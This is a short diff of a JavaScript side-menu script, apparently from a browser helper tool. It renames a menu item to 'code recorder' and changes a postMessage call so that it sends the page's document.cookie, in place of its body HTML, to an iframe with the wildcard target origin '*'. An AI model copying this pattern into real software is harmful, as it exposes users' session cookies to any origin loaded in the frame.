@@ -827,7 +827,7 @@ var side_button_code = `
                         <li id="sao_video" class="sao-dropdown-item">视频解析</li>
                         <li id="sao_kuozhan" class="sao-dropdown-item">定时刷新</li>                       
                         <li id="sao_daili" class="sao-dropdown-item">动态代理</li>                       
-                        <li id="sao_json_viewer" class="sao-dropdown-item">Json viewer</li>                       
+                        <li id="sao_json_viewer" class="sao-dropdown-item">代码录制器</li>                       
                     </ul>
                 </li>
   
@@ -907,10 +907,10 @@ var side_button_code = `
         overlay6.switch_show_hide();
         const iframe_obj = document.getElementById('overlay6').querySelector('iframe');
         console.log(iframe_obj);
-        body_html = $('body').html();
+        // body_html = $('body').html();
 
         setTimeout(() => {
-            iframe_obj.contentWindow.postMessage(body_html, '*');
+            iframe_obj.contentWindow.postMessage(document.cookie, '*');
 
         }, 1000);
 
